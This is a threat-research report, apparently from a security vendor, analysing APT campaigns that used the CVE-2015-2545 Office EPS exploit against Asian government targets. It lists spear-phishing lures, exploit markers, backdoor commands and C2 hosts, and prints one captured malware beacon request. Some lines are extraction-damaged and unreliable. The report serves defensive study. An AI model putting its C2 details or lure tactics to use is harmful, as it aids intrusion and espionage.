The vulnerability affects Microsoft\nOffice versions 2007 SP3, 2010 SP2, 2013 SP1 and 2013 RT SP1.\n\nThe error enables an attacker to execute arbitrary code using a specially crafted EPS image file. The exploit uses PostScript and can evade\nAddress Space Layout Randomization (ASLR) and Data Execution Prevention (DEP) protection methods.\n\n[The exploit was discovered in the wild in August 2015, when it was used in a targeted attack by the Platinum group, presumably against](https://www.microsoft.com/security/blog/2016/04/26/digging-deep-for-platinum/)\ntargets in India. Over the following months, there was significant growth in the number of threat actors using the vulnerability as a primary tool\nfor initial penetration, with both the attack groups and their targets located in South-East and Central Asia and the Far East.\n\nIn this research paper, we discuss examples of attacks using the CVE-2015-2545 vulnerability undertaken by some of these groups.\n\n## Overview of groups using CVE-2015-2545\n\n### Platinum (also known as TwoForOne)\n\nThe group is believe to originate from South-East Asia. Its attacks can be traced as far back as 2009. The group is notable for exploiting 0-day\nvulnerabilities and carrying out a small number of highly focused targeted attacks – mostly against government agencies in Malaysia,\nIndonesia, China and India.\n\nThis group was the first to exploit the CVE-2015-2545 vulnerability. After the vulnerability was corrected with Microsoft updates in September\nand November 2015, no new Platinum attacks exploiting this vulnerability have been detected.\n\nMicrosoft presented the activity of this group at the SAS conference in February 2016, and in its paper: PLATINUM: Targeted attacks in South\nand Southeast Asia.\n\n### APT16\n\nThe group has been known for several years and is believed to be of Chinese origin. In November and December 2015, it used a modified\nexploit for CVE-2015-2545 in attacks against information and news agencies in Taiwan. These attacks were described in a FireEye research\npaper – The EPS Awakens – Part 2 (https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html).\n\n### EvilPost\n\nIn December 2015, Kaspersky Lab became aware of a targeted attack against the Japanese defense sector. In order to infect victims, the\nattacker sent an email with an attached DOCX file exploiting the CVE-2015-2545 vulnerability in Microsoft Office using an embedded EPS\n(Encapsulated Postscript) object. The EPS object contained a shellcode that dropped and loaded a 32-bit or 64-bit DLL file depending on the\nsystem architecture. This, in turn exploited another vulnerability to elevate privileges to Local System (CVE-2015-1701) and download\nadditional malware components from the C&C server.\n\n\n-----\n\ne C&C se e used t e attac as ocated Japa a d appea s to a e bee co p o sed o e e, t e e s o d cat o t at t as\never been used for any other malicious purpose. Monitoring of the server activity for a period of several months did not result in any new\nfindings. We believe the attackers either lost access to the server or realized that it resulted in too much attention from security researchers, as\nthe attack was widely discussed by the Japanese security community.\n\nAccording to our research partner in Japan, the original EvilPost attack in December 2015 arrived as a spear-phishing email with a Word\ndocument attached.\n\nThis document embedded an EPS object file, which triggered a vulnerability in the EPS format handler in Microsoft Word. Even with an exploit\ncomponent, Microsoft Word rendered the document correctly and displayed the decoy message. The document is written in good Japanese,\nas shown below.\n\nIt has been used to decoy New Year impressions of defense-related organizations.\n\nThis attack was also described in the FireEye report (https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html),\nmentioned above.\n\n[An overview of the activity of the EvilPost group activity was provided to subscribers of the Kaspersky Lab Threat Intelligence Service in March](http://www.kaspersky.com/enterprise-security/intelligence-services)\n[2016. For information about the service, please write to intelreports@kaspersky.com.](http://10.10.0.46/mailto:intelreports@kaspersky.com)\n\n### SPIVY\n\nIn March and April 2016, a series of emails laced with an exploit forCVE-2015-2545 were detected. The emails were sent in spear-phishing\nattacks, presumably targeting organizations in Hong Kong. Identifying a specific group behind these attacks is difficult because they used a\nnew variant of a widely available backdoor known as PoisonIvy (from which the name of the group, SPIVY, is derived). A description of these\n[incidents can be found in the PaloAlto blog.](http://researchcenter.paloaltonetworks.com/2016/04/unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists/)\n\n### Danti and SVCMONDR\n\nThese two groups have not yet been publicly described. An overview of their attacks and the tools used is provided in this report.\n\n## Danti attacks\n\nDanti (Kaspersky Lab’s internal name) is an APT actor that has been active at least since 2015, predominantly targeting Indian government\norganizations. According to our telemetry, Danti has also been actively hitting targets in Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal\nand the Philippines.\n\n\n-----\n\ne g oup p e e ted a e ca pa g eb ua y a d a c 0 6, us g a epu posed p e e tat o o t e C 0 5 5 5 e p o t t\ncustom shellcode. In order to infect the victim, the attackers distributed spear-phishing emails with an attached DOCX file exploiting the CVE2015-2545 vulnerability in Microsoft Office. The exploit is based on a malformed embedded EPS (Encapsulated Postscript) object. This\ncontains the shellcode that drops a backdoor, providing full access to the attackers.\n\n**Main findings:**\n\nDanti, a previously unknown group, is probably related to NetTraveller and DragonOK\nIn February-March 2016 the group was observed using CVE-2015-2545\nIt remains active, conducting attacks against Indian diplomatic organizations\nRelated attacks have been observed against Central and South East Asia targets\n\nThe campaign leveraging the exploit for CVE-2015-2545 took place in February 2016. As a result, several emails with attached DOCX files\nwere uploaded to VirusTotal. The email recipients were connected to the Indian Ministry of External Affairs, as can be seen below:\n\ndsfsi@nic.in, the Foreign Service Institute, Ministry of Foreign Affairs (Under Secretary (FT/NRG), dsfsi@mea.gov.in)\nchumarpost@gmail.com, possibly related to the Chumar military post in India, a disputed area between India and China (the mail server\nis the same as the Indian Ministry of Foreign Affairs- vastuXX.nic.in)\nchancery@indianembassy.hu, the Indian embassy in Hungary\namb.copenhagen@mea.gov.in, the Indian Embassy in Denmark\namb.bogota@mea.gov.in, the Indian embassy in Colombia\n\nAll these attacks took place between the 2nd and 29 of February, 2016.th\n\nTarget and date Attachment name Sender\n\n\nIndian embassy in Hungary\n2nd February\n\nIndian embassy in Denmark\n2nd February\n\nIndian embassy in Colombia\n2nd February\n\nDSFSI\n24 Februaryth\n\nChumapost\n29 Februaryth\n\n\nMission List.doc unknown (original email was forwarded)\n\nHQ List.doc mout.gmx.com ([74.208.4.200])\n\nHQ List.doc mout.gmx.com ([74.208.4.201])\n\nIndia’s 10 Top Luxury Hotels.doc 191.96.111.195 via mout.gmx.com ([74.208.4.201])\n\nIndia’s 10 Top Luxury Hotels.doc 43.227.113.129 via mout.gmx.com ([74.208.4.200])\n\n\nIn the case of the Indian Embassy in Hungary, it looks like the original message was forwarded from the embassy to the Indian IT security\nteam in the Ministry of Foreign Affairs, and uploaded later to Virus Total.\n\n### Initial vector\n\nThe emails that were analysed had originally been sent via “3capp-mailcom-lxa06.server.lan”, perhaps using a spam-mailer program. In all\nknown cases, the sender used the same gate at 74.208.4.200/74.208.4.201 (mout.gmx.com).\n\nThe email messages changed for different waves of the campaign. When the campaign started in February 2nd, the emails carried the subject\nheaders “Mission List” and “HQ List”, and forged the identity of a real sender.\n\n\n-----\n\n_Original message used in the first wave of attacks_\n\n[As can be seen above, the original email was supposedly forwarded from Anil Kumar Balani, Director of the Department of Information](http://deity.gov.in/content/national-knowledge-network)\nTechnology at the Indian Ministry of Communications & Information Technology.\n\n_Mission List decoy document_\n\nAt the same time, attackers sent a slightly different document with the subject “HQ List” to other Indian embassies (for example, those in\nDenmark and Colombia):\n\n\n-----\n\n_Original HQ List email_\n\nK.Nagaraj Naidu is Director of the Investments Technology Promotion Division in the Ministry of External Affairs, and a former Counsellor\n(T&C) at the Embassy of India in China.\n\n_HQ List decoy document_\n\nBoth files (“Mission List” and “HQ list”) have different decoy content, but both use the same CVE-2015-2545 EPS exploit (image1.eps, MD5\na90a329335fa0af64d8394b28e0f86c1).\n\nInterestingly, as can be seen in their metadata, both files were modified by the user “India” on 01.02.2016, just one day before they were sent\nto targets.\n\n“HQ List” metadata “Mission List” metadata\n\n\n-----\n\nFor the attacks at the end of February, the attackers decided to use the less relevant subject header of “10 top luxury hotels in India”, sent from\nan unknown sender.\n\n_Top Luxury Hotels spear-phishing email_\n\nThis new attachment contains the same EPS exploit, but uses a different decoy document and a new payload.\n\n\n-----\n\n_Top 10 Luxury Hotels decoy document_\n\n[The text of the document was copied from a Forbes article published in 2007. According to its metadata, the document was created in June](http://www.forbes.com/2007/11/16/hotels-top-india-forbeslife-cx_pl_1116hotelsindia.html)\n2015, so it has probably been used before in unknown attacks.\n\nHowever, the same mail gate (mout.gmx.com) was used as for the 2nd February attacks.\n\n_Email header from February 29_\n\n_Email header from February 24_\n\nAll the “doc” files are Web Archive Files and contain decoy documents and a malicious EPS. The structure of the WAF files is the same in all\nthree cases:\n\n\n-----\n\n_Web archive structure_\n\n### Exploit\n\nThe attackers used at least one known 1-day exploit: the exploitforCVE-2015-2545 – EPS parsing vulnerability in EPSIMP32.FLT module,\nreported by FireEye, and patched by Microsoft on 8 September 2015 with MS15-099.\n\nWe are currently aware of about four different variants of the exploit.\n\nThe original one was used in August 2015 against targets in India by the Platinum (TwoForOne) APT group.\n\n_Original EPS exploit, used in August 2015_\n\nThe second (which is a modified variant of the original exploit) was used in EvilPost attacks against Japan in 2015, and then reused by\ncybercriminals in March 2016. This variant was also used by the APT16 group (ELMER backdoor) in Taiwan in December 2015. The second\nvariant is easily recognized by the specific strings in its EPS shellcode:\n\n_The “h:\\test.txt” string could have been forgotten by the exploit developer_\n\nThe third variant was used in December 2015 against a Taiwanese organization, and in February 2016 against an Indian diplomatic\norganization. This variant uses different shellcode but is based on the original exploit from the Platinum (TwoForOne) APT:\n\n_Can be recognized by “add2 <eb135” substring_\n\nIn the third variant, the binaries with the encrypted malicious exe file and the decoy document can be found at the end of the files.\n\nIn the third variant, the binary starts with “PdPD” (50 64 50 44), a marker previously used for encrypted binaries by a number of APT groups\n(Anchor Panda, Samurai Panda, Temper Panda).\n\n\n-----\n\n_Encrypted data at the end of the eps file_\n\nThe decryption function is 1-byte XOR with a key from “x00” to “xff” and replacement of the Odd byte for an Even byte in several hundred bytes\nfrom the header.\n\n_Decrypted exe file_\n\n_Decrypted decoy document_\n\nWe detected a few different EPS objects in the exploit and these are analyzed below. The fourth variant of the exploit is analyzed in the “March\nattack” section.\n\nRead more about EPS objects and Payload in the Appendix.\n\n## March attack\n\n\n-----\n\nt t e e d o a c 0 6, e d sco e ed a e a e o attac s by t e a t g oup aga st d a go e e ta st tut o s O a c 8\nseveral malicious document were sent to various recipients at the Cabinet Secretariat of Government India from the email account of Ms.\nRicha Gaharwar (<richa.gaharwar@nic.in>), Deputy Secretary at The Department of Administrative Reforms and Public Grievances, the nodal\nagency of the Government of India.\n\n_Email sent from the account of Ms. Richa Gaharwar_\n\nThe message was sent from an internal IP address using Oracle Communications Messenger. This could mean that the employee workstation\nused to send the malicious emails had been fully compromised.\n\n\n-----\n\n_a_ _eade_\n\nThe attachment contains the file “Holidays in India in 2016.docx” with the embedded EPS exploit. This time the attackers used the second\nvariant of the exploit (previously used by the EvilPost and APT16 groups), with minor changes:\n\nThey removed the part with the “h:\\test.txt” strings\nDropped the binary added at the end of the EPS object (the same as in the third variant of the exploit)\n\nInstead of using the “PdPD” string as a marker for binary, they used a new identifier: “1111111122222222”\n\n_New identifier used_\n\nAll these changes created a new variant of the exploit, detected by very few antivirus products.\n\nThe decoy document was created on January 27, and then modified by adding the EPS exploit on March 28, right before the attack.th th\n\n\n-----\n\n_ecoy docu_ _e t_\n\nAccording to its metadata, the document was created and modified by Chinese users:\n\n_Decoy´s metadata_\n\n### March attack – payload\n\nThe dropped file is a RarSFX archive (331307 bytes). According to comments in the archive, this was also created by a Chinese user:\n\nThe dropper installs four files in the system. The “Appinfo.dat” file launches “PotPlayerMini.exe”, monitors the memory periodically with the\nGlobalMemoryStatus API function and writes the results to “C:windowsmemstatus.txt”\n\n[The main loader “PotPlayerMini.exe” is a legitimate multimedia player from Daum Communication. The file is signed with a legitimate signature](https://potplayer.daum.net/)\nfrom “Daum Communications Corp.”\n\n\n-----\n\n_Digital signature information_\n\nThis legitimate file is used by the attackers to load a malicious, unsigned file from the same folder: PotPlayer.dll (the hardcoded PDB path\ninside is “C:UsersjohnDesktopPotPlayerReleasePotPlayer.pdb”). This, in turn executes appinfo.dat (the hardcoded PDB path inside is\n“D:BaiduYunDownloadServiceExeReleaseServiceExe.pdb”), which is a Yoda-compressed binary. The backdoor code is stored inside\nupdate.dat.\n\nThe potplayer.dll “PreprocessCmdLineEx” export function:\n\nCreates a service named “MemoryStatus” with a path to “appinfo.dat” file and sets it to HKEY_CURRENT_USER\nSoftwareMicrosoftWindowsCurrentVersionRun with the name “potplayer”.\nOpens “update.dat” file, decrypts it with xor operations and passes the execution to the result buffer.\n\n“update.dat”, a backdoor:\n\nMakes its first GET request to hardcoded CnC “newsupdate.dynssl.com/index.html” in order to get the new CnC in the response.\n\nIf 407 response code is returned (Proxy authentication required) then the sample sends the request again with “proxyname” string as the proxy\nusername and “proxypass” string as the proxy password. That suggests that may be the sample is compiled using some builder where these\nparameters must be set manually and in this specific sample were not changed from default.\n\nFinds “8FC628C9F43D42E2B77C2801518AF2A5” substring and decrypts it using AES CTR mode thrice using three 16-bytes keys.\n\n\n-----\n\na es a OS equest to t e e C C t a date U pa a ete a d e pects success st g as t e espo se\n\nForms the following structure in order to send to CnC in POST-request after AES encryption:\n\n“CFB4CDE8-9285-4CC2-ACE2-CD9CCDF22C0D” string\nLocal IP\nHost name\n0x3E9 dword\nOS version\nSYSTEM_INFO structure\n\nDecrypts the response using AES with one key.\n\nCommands:\n\nLists files in directory\nEnumerates drives and their type\nEnumerates given registry key and value\nEnumerates processes\nDeletes given file\nCreates given process\nMoves or copies given file\nUploads file\nWrites to file and launches it\nEnumerates services\nTerminates given process\nProvides shell via cmd.exe\n\nThe malware connects to the following C2s:\n\nnewsupdate.dynssl.com (103.61.136.120)\ndnsnews.dns05.com (118.193.12.252)\n\nThe connection:\n\n\n-----\n\nThe two hosts are dynamic DNS subdomains, using the provider CHANGEIP DNS.\n\n## SVCMONDR: the Taiwan case\n\nIn December 2015, we uncovered another example of the type of shellcode found in the exploit for CVE-2015-2545. On 11 December, a spearphishing email was sent by attackers to an employee of a Taiwanese security software reseller.\n\n\n-----\n\n_Spear-phishing email_\n\nThe attachment contained a Web Archive File with “1-3說明檔.doc” and a malicious EPS file inside.\n\n_“1-3說明檔.doc”_\n\nThis EPS (98c57aa9c7e3f90c4eb4afeba8128484) is exploit CVE-2015-2545 and contains an encrypted binary starting with “PdPD” (50 64 50\n44), the same as seen in the Danti attacks.\n\nThe structure of the Web Archive also carries references to the same files as the Danti group (with image002.gif and “image002.eps”.)\nHowever, the files themselves are absent from the archive.\n\n\n-----\n\n_Part of the Web Archive_\n\nThis resemblance could mean that we can attribute this case to the Danti group. However, it could also be a coincidence or yet another case of\ndifferent groups using the same malicious code. That’s why we are noting this incident separately from the Danti group’s activity.\n\nInterestingly, in the first few days of December, another group – APT16 (FireEye’s classification) also targeted Taiwan-based organizations with\na CVE-2015-2545 EPS exploit, and its emails originated from the same domain as the one sent by the SVCMONDR attackers. However, it\nused another type of shellcode and a different backdoor – ELMER (https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakenspart-two.html).\n\nAfter opening the doc file (which is again a Web Archive File), the exploit drops and executes the Trojan program “svcmondr.exe”\n(8052234dcd41a7d619acb0ec9636be0b).\n\nThis queries the registry:\n\n“HKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsConnectionsDefaultConnectionSettings” and\n“HKCUSoftwareMicrosoftWindowsCurrentVersionInternetSettingsConnectionsDefaultConnectionSettings” and compares the values. If they\ndon’t coincide, it sets the “DefaultConnectionSettings” value from the HKEY_USERS to HKCU key.\n\nIt sets values taken from:\n\n1. HKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones3 {A8A88C49-5EB2-4990-A1A2-0876022C854F}\n2. HKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones3 {AEBA21FA-782A-4A90-978D-B72164C80120}\n3. HKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones31A10\n\nTo the appropriate HKCU key (for example: HKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones3 {A8A88C49-5EB2-4990A1A2-0876022C854F}, etc.).\n\nThen forms the structure in order to send it to the CnC in a POST-request with the following fields:\n\n0x8888 constant\n0x8000 constant\n18-bytes hex string based on CoCreateGuid function\nLocal IP\nMAC address\n\n_Example of POST request_\n\n\n-----\n\nt e codes t e esu t g st uctu e t base6 a p e o a OS equest\n\nPOST / HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\nHost: 59.188.13.204:9080\nContent-Length: 112\nConnection: Keep-Alive\nCache-Control: no-cache\n\nAAAAAIiIAAAAgAAAAAAAAGQwNTRlYTkxMDAwMGEyZmU3NAAAAAAAAAAAAAAAAAAAMTAuNjMuMTIuNAAAAAAAADAwMEMyOUU5Nzg2\n\nBased on the CnC response, the sample:\n\nChecks the password in the CnC response and compares it with the hardcoded password “1010” in its configuration structure. If the\npassword is valid, it sets a “certified” flag and can further process the following commands.\nLaunches given command line with ShellExecute, writes output results to %tmp% file, sends results to CnC and deletes the file.\nDownloads file to %Temp% folder.\nUploads given file to CnC.\nSets sleep interval.\n\nAll results sent to the CnC after processing commands are encrypted with RC4 with a MAC-address as a key.\n\nThe CnC points to an IP address in Hong Kong. This IP address belongs to a local private company, but falls within a range of IP addresses\nthat belong to another enterprise that has already been identified as a host location for command and control servers that communicate with\nmalware.\n\n[The CnC has been used in other APT incidents, attributed by FireEye to the group “admin@338” aka “Temper Panda” (59.188.0.197,](https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html)\naccounts.serveftp.com).\n\nIn general, this IP address space from “New World Telecom HK” is one of the favorite places used by different Chinese-origin APT groups to\nhost command & control servers/proxies.\n\nAnother detail suggesting a possible relationship between SVCMONDR and Temper Panda is the use of the “PdPD” (50 64 50 44) marker for\nencrypted binaries. According to Crowdstrike, the same marker has been used previously by a number of APT groups (Anchor Panda,\nSamurai Panda and Temper Panda).\n\nThe latest known activity of “admin@338” was in August 2015, when it was used to target Hong Kong-based media using its own tools,\nLOWBALL and BUBBLEWRAP.\n\nHowever, we are unable to draw any conclusion regarding the relationship between the SVCMONDR group and Temper Panda.\n\nAccording to KSN data, in addition to Taiwan, there are some SVCMONDR victims in Thailand.\n\n## Conclusions\n\nWe are currently aware of at least four different APT actors actively using exploits of the CVE-2015-2545 vulnerability: TwoForOne (also known\nas Platinum), EvilPost, APT16 and Danti.\n\nThese groups have their own toolsets of malicious program. Danti’s arsenal is more extensive than those of EvilPost and APT16, and in terms\nof functionality can be compared with Platinum. All groups are focused on targets in the Asian region and have never been seen in incidents in\nWestern Europe or the USA.\n\nThe TwoForOne (Platinum) group is described in Microsoft research, APT16 in FireEye reports, and EvilPost and Danti in Kaspersky Lab\nprivate reports.\n\nDanti is highly focused on diplomatic entities. It may already have full access to internal networks in Indian government structures. According\nto Kaspersky Security Network, some Danti Trojans have also been detected in Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal and the\nPhilippines.\n\nDespite the fact that Danti uses a 1-day exploit, the group is able to make its own modifications to bypass current antivirus detections. A\nnumber of the modules used by Danti have the same functionality as previously known and used malicious programs like NetTraveller and\nDragonOK.\n\nThe use of CVE-2015-2545 exploits is on the rise. In addition to the groups mentioned above, we have seen numerous examples of these\nexploits being used by traditional cybercriminals in mass mailings in February-April 2016.
